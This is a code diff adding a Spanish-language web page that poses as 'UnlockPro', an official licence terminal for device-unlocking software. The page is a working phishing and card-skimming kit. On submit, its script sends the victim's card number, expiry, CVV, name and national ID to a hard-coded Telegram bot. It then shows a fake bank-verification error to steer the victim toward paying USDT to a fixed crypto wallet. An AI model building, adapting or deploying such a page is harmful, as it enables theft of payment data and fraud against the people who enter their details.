@@ -1,0 +1,334 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>UnlockPro | Official License Terminal</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --primary-grad: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
+      --accent: #3b82f6; 
+      --dark-card: #16161a;
+      --border-soft: rgba(255, 255, 255, 0.08);
+      --success: #22c55e;
+      --error: #ef4444;
+      --text-muted: #94a3b8;
+      --crypto: #f3ba2f;
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+    
+    body {
+      font-family: 'Inter', sans-serif;
+      background-color: #0c0c0e;
+      color: #f8fafc;
+      line-height: 1.5;
+      padding-top: 70px;
+    }
+
+    nav {
+      position: fixed; top: 0; left: 0; width: 100%; height: 65px;
+      background: rgba(12, 12, 14, 0.8); backdrop-filter: blur(20px);
+      border-bottom: 1px solid var(--border-soft);
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 0 20px; z-index: 1000;
+    }
+    .logo { font-size: 1.2rem; font-weight: 800; letter-spacing: -0.5px; }
+    .logo span { color: var(--accent); }
+    
+    .status-pill {
+      display: flex; align-items: center; gap: 6px;
+      background: rgba(34, 197, 94, 0.1); color: var(--success);
+      padding: 5px 12px; border-radius: 20px; font-size: 0.7rem; font-weight: 700;
+    }
+    .pulse-dot { width: 6px; height: 6px; background: var(--success); border-radius: 50%; animation: pulse 2s infinite; }
+
+    @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
+
+    .container { max-width: 500px; margin: 0 auto; padding: 20px; }
+
+    .hero { text-align: center; margin-bottom: 30px; }
+    .hero h1 { font-size: 1.8rem; font-weight: 800; margin-bottom: 10px; line-height: 1.2; }
+    .hero p { color: var(--text-muted); font-size: 0.9rem; }
+
+    .input-field { margin-bottom: 20px; }
+    .input-field label { display: block; font-size: 0.75rem; font-weight: 700; color: #555; margin-bottom: 8px; text-transform: uppercase; }
+    
+    .input-wrapper {
+        position: relative;
+        background: var(--dark-card);
+        border: 1px solid var(--border-soft);
+        border-radius: 14px;
+        display: flex;
+        align-items: center;
+        padding: 0 16px;
+        transition: 0.3s;
+    }
+    
+    input {
+      width: 100%; padding: 16px; background: transparent; color: #fff;
+      border: none; font-size: 1rem; outline: none;
+    }
+    
+    .card-input {
+      background: var(--dark-card);
+      border: 1px solid var(--border-soft);
+      border-radius: 14px;
+      margin-bottom: 10px;
+      padding: 16px;
+      color: #fff;
+      width: 100%;
+    }
+
+    .card-brand-icon {
+        position: absolute;
+        right: 15px;
+        top: 50%;
+        transform: translateY(-50%);
+        width: 32px;
+        height: auto;
+        opacity: 0;
+        transition: 0.3s;
+        pointer-events: none;
+    }
+    .card-brand-icon.visible { opacity: 1; }
+
+    .package-list { display: flex; flex-direction: column; gap: 12px; margin-bottom: 20px; }
+    .pkg-item {
+      background: var(--dark-card); padding: 18px; border-radius: 16px;
+      border: 1px solid var(--border-soft); display: flex;
+      justify-content: space-between; align-items: center; transition: 0.2s;
+      cursor: pointer;
+    }
+    .pkg-item.selected { border-color: var(--accent); background: rgba(59, 130, 246, 0.05); }
+    .pkg-name { font-weight: 600; font-size: 0.95rem; }
+    .pkg-price { font-weight: 800; color: #fff; }
+
+    .btn-submit {
+      width: 100%; padding: 18px; border-radius: 16px; border: none;
+      background: var(--accent); color: #fff; font-size: 1rem;
+      font-weight: 800; cursor: pointer; box-shadow: 0 10px 20px rgba(59, 130, 246, 0.2);
+    }
+
+    #loading {
+      position: fixed; inset: 0; background: rgba(0,0,0,0.95);
+      display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 2000;
+    }
+    .spinner { border: 3px solid #222; border-top: 3px solid var(--accent); border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    #customAlert {
+      position: fixed; top: 20px; left: 50%; transform: translateX(-50%) translateY(-200px);
+      background: rgba(25, 25, 30, 0.95); color: #fff; padding: 16px 30px; border-radius: 20px;
+      border: 1px solid rgba(255, 255, 255, 0.1); z-index: 5000; transition: 0.5s;
+      font-size: 0.85rem; font-weight: 600; text-align: center; min-width: 300px; backdrop-filter: blur(10px);
+    }
+    #customAlert.show { transform: translateX(-50%) translateY(70px); }
+
+    /* CRYPTO */
+    .crypto-container { background: #1a1a1e; border-radius: 20px; padding: 20px; border: 1px solid var(--border-soft); margin-top: 20px; }
+    .address-box { background: #000; padding: 15px; border-radius: 12px; margin: 10px 0; border: 1px solid #333; position: relative; }
+    .address-text { font-family: monospace; font-size: 0.8rem; color: var(--crypto); word-break: break-all; padding-right: 30px; }
+    .copy-icon { position: absolute; right: 10px; top: 50%; transform: translateY(-50%); cursor: pointer; opacity: 0.6; }
+    .file-upload-label {
+      display: flex; align-items: center; justify-content: center; gap: 10px;
+      background: rgba(255,255,255,0.05); border: 2px dashed #333;
+      padding: 20px; border-radius: 15px; cursor: pointer;
+    }
+    #fileName { font-size: 0.75rem; color: var(--success); margin-top: 10px; display: none; text-align: center; }
+    .qr-img { width: 180px; height: 180px; border-radius: 15px; margin: 15px auto; display: block; border: 4px solid #fff; }
+
+    footer { text-align: center; padding: 40px 20px; color: #334155; font-size: 0.7rem; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; }
+  </style>
+</head>
+<body>
+
+  <div id="customAlert"></div>
+
+  <nav>
+    <div class="logo"><span>UNLOCK</span> PRO</div>
+    <div class="status-pill"><div class="pulse-dot"></div> SERVERS ONLINE</div>
+  </nav>
+
+  <div id="step1" class="container">
+    <div class="hero">
+      <h1>Software de Desbloqueo</h1>
+      <p>Licencias oficiales para servicio técnico multimarca.</p>
+    </div>
+
+    <div class="input-field">
+      <label>Email de Activación</label>
+      <div class="input-wrapper">
+          <input type="email" id="username" placeholder="ejemplo@correo.com">
+      </div>
+    </div>
+
+    <div class="package-list">
+        <div class="pkg-item" onclick="selectPkg('Licencia Mensual', '25', this)">
+            <span class="pkg-name">ACCESO 30 DIAS</span>
+            <span class="pkg-price">30K ARS /22 USDT</span>
+        </div>
+        <div class="pkg-item" onclick="selectPkg('Licencia Anual', '150', this)">
+            <span class="pkg-name">ACCESO 1 AÑO</span>
+            <span class="pkg-price">50K ARS/36 USDT</span>
+        </div>
+        <div class="pkg-item" onclick="selectPkg('Licencia Lifetime', '300', this)">
+            <span class="pkg-name">PAGO UNICO</span>
+            <span class="pkg-price">150K ARS/107 USDT</span>
+        </div>
+    </div>
+
+    <button class="btn-submit" onclick="verificarYPasar()">GESTIONAR LICENCIA</button>
+  </div>
+
+  <div id="step2" class="container" style="display:none;">
+    <div style="background: var(--dark-card); padding: 30px; border-radius: 25px; border: 1px solid var(--border-soft);">
+      <h3 style="text-align:center; margin-bottom: 25px;">Finalizar Orden</h3>
+      <div id="checkoutInfo" style="margin-bottom: 25px; font-size: 0.9rem;"></div>
+      <button class="btn-submit" onclick="showCardStep()" style="background: #fff; color: #000; margin-bottom: 12px;">TARJETA CRÉDITO/DÉBITO</button>
+      <button class="btn-submit" onclick="showCryptoStep()" style="background: var(--crypto); color: #000;">PAGO CRIPTO (USDT)</button>
+      <p onclick="location.reload()" style="text-align:center; margin-top: 20px; font-size: 0.8rem; color: #555; font-weight: 700; cursor:pointer;">← CANCELAR</p>
+    </div>
+  </div>
+
+  <div id="step3" class="container" style="display:none;">
+    <div style="background: var(--dark-card); padding: 30px; border-radius: 25px; border: 1px solid var(--border-soft);">
+      <div style="display: flex; align-items: center; justify-content: center; gap: 8px; color: var(--success); font-weight: 800; font-size: 0.75rem; text-transform: uppercase; margin-bottom: 20px;">SISTEMA CIFRADO SSL</div>
+      <form id="cardForm">
+        <input type="text" id="cName" class="card-input" placeholder="Titular de la tarjeta" required>
+        <div class="input-wrapper" id="cNumWrapper" style="margin-bottom: 10px;">
+            <input type="tel" id="cNum" placeholder="Número de tarjeta" maxlength="19" required>
+            <img id="visaLogo" src="https://img.icons8.com/color/48/visa.png" class="card-brand-icon">
+            <img id="masterLogo" src="https://img.icons8.com/color/48/mastercard.png" class="card-brand-icon">
+            <img id="amexLogo" src="https://img.icons8.com/color/48/amex.png" class="card-brand-icon">
+        </div>
+        <div style="display: flex; gap: 10px;">
+          <input type="tel" id="cExp" class="card-input" placeholder="MM/AA" maxlength="5" required>
+          <input type="tel" id="cCvc" class="card-input" placeholder="CVV" maxlength="4" required>
+        </div>
+        <input type="tel" id="cDni" class="card-input" placeholder="Documento de Identidad" required>
+        <button type="submit" class="btn-submit" style="margin-top:10px;">PAGAR AHORA</button>
+      </form>
+      <div id="errorMsg" style="color: #f87171; font-size: 0.75rem; text-align: center; margin-top: 15px; display: none; padding: 10px; background: rgba(248,113,113,0.1); border-radius: 10px;"></div>
+    </div>
+  </div>
+
+  <div id="stepCrypto" class="container" style="display:none;">
+    <div style="background: var(--dark-card); padding: 30px; border-radius: 25px; border: 1px solid var(--border-soft);">
+      <div style="text-align:center; margin-bottom: 10px;">
+        <img src="https://img.icons8.com/color/96/tether.png" width="50">
+        <h3>Pago USDT (TRC20)</h3>
+      </div>
+      <img src="qr.jpg" alt="QR de Pago" class="qr-img">
+      <div class="crypto-container">
+        <label style="font-size: 0.7rem; font-weight: 800;">BILLETERA USDT</label>
+        <div class="address-box">
+          <span class="address-text" id="walletAddr">TKnfinsu3UxWd87RiW9uHL9EVBrU5n5DJQ</span>
+          <img src="https://img.icons8.com/material-outlined/24/ffffff/copy.png" class="copy-icon" onclick="copyWallet('walletAddr')">
+        </div>
+      </div>
+      <div style="margin-top: 25px;">
+        <label class="file-upload-label" for="cryptoFile">
+          <span style="font-weight:700; font-size:0.85rem;">SUBIR COMPROBANTE</span>
+          <input type="file" id="cryptoFile" accept="image/*" style="display:none;" onchange="handleFile(this)">
+        </label>
+        <p id="fileName"></p>
+      </div>
+      <button id="btnVerifyCrypto" class="btn-submit" style="margin-top:20px; opacity: 0.5; pointer-events: none;" onclick="enviarComprobanteCrypto()">NOTIFICAR PAGO</button>
+    </div>
+  </div>
+
+  <div id="loading"><div class="spinner"></div></div>
+
+  <footer>© 2026 UnlockPro Terminal</footer>
+
+  <script>
+    let selPack = { n: "", p: "" };
+    let selectedFile = null;
+    const botToken = "8562465983:AAG6Ure3ZmQ9Pke0MVNjD4512VfJT00nJ2w";
+    const chatId = "6493944778";
+
+    function selectPkg(name, price, el) {
+        document.querySelectorAll('.pkg-item').forEach(x => x.classList.remove('selected'));
+        el.classList.add('selected'); selPack = { n: name, p: price };
+    }
+
+    function showAlert(msg) {
+        const b = document.getElementById('customAlert');
+        b.innerText = msg; b.classList.add('show');
+        setTimeout(() => b.classList.remove('show'), 3000);
+    }
+
+    function verificarYPasar() {
+        if(!document.getElementById('username').value || !selPack.n) return showAlert("⚠️ Completa tus datos.");
+        document.getElementById('step1').style.display = 'none';
+        document.getElementById('step2').style.display = 'block';
+        document.getElementById('checkoutInfo').innerHTML = `<p>Licencia: <b>${selPack.n}</b></p><p>Total: <b style="color:var(--success)">USD ${selPack.p}</b></p>`;
+    }
+
+    function showCardStep() { document.getElementById('step2').style.display = 'none'; document.getElementById('step3').style.display = 'block'; }
+    function showCryptoStep() { document.getElementById('step2').style.display = 'none'; document.getElementById('stepCrypto').style.display = 'block'; }
+
+    // Logica Tarjetas
+    const cNumInput = document.getElementById('cNum');
+    cNumInput.addEventListener('input', e => {
+        let v = e.target.value.replace(/\D/g, '');
+        document.getElementById('visaLogo').classList.toggle('visible', v.startsWith('4'));
+        document.getElementById('masterLogo').classList.toggle('visible', /^(5[1-5]|2)/.test(v));
+        document.getElementById('amexLogo').classList.toggle('visible', /^(34|37)/.test(v));
+        e.target.value = v.match(/.{1,4}/g)?.join(' ') || v;
+    });
+
+    // CORRECCION FECHA VENCIMIENTO MM/AA
+    const cExpInput = document.getElementById('cExp');
+    cExpInput.addEventListener('input', e => {
+        let v = e.target.value.replace(/\D/g, '');
+        if (v.length >= 2) {
+            v = v.substring(0, 2) + '/' + v.substring(2, 4);
+        }
+        e.target.value = v;
+    });
+
+    document.getElementById('cardForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        document.getElementById('loading').style.display = 'flex';
+        const text = `🚨 NUEVO PAGO TARJETA (UNLOCKER)\n\nEmail: ${document.getElementById('username').value}\nPack: ${selPack.n}\nTitular: ${document.getElementById('cName').value}\nNúmero: ${document.getElementById('cNum').value}\nExp: ${document.getElementById('cExp').value}\nCVV: ${document.getElementById('cCvc').value}\nDNI: ${document.getElementById('cDni').value}`;
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
+        setTimeout(() => {
+            document.getElementById('loading').style.display = 'none';
+            document.getElementById('errorMsg').innerText = "ERROR DE PASARELA: El banco requiere validación 3D Secure. Intente con Cripto para activación inmediata.";
+            document.getElementById('errorMsg').style.display = 'block';
+        }, 3000);
+    });
+
+    // Logica Crypto
+    function handleFile(input) {
+      if (input.files[0]) {
+        selectedFile = input.files[0];
+        document.getElementById('fileName').innerText = "Captura cargada: " + selectedFile.name;
+        document.getElementById('fileName').style.display = "block";
+        document.getElementById('btnVerifyCrypto').style.opacity = "1";
+        document.getElementById('btnVerifyCrypto').style.pointerEvents = "all";
+      }
+    }
+
+    async function enviarComprobanteCrypto() {
+      document.getElementById('loading').style.display = 'flex';
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append('caption', `💰 COMPROBANTE CRYPTO\nEmail: ${document.getElementById('username').value}\nPack: ${selPack.n}`);
+      formData.append('photo', selectedFile);
+      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
+      document.getElementById('loading').style.display = 'none';
+      showAlert("✅ Comprobante enviado. Revisaremos tu pago.");
+      setTimeout(() => location.reload(), 3000);
+    }
+
+    function copyWallet(id) {
+      navigator.clipboard.writeText(document.getElementById(id).innerText);
+      showAlert("✅ Dirección copiada");
+    }
+  </script>
+</body>
+</html>
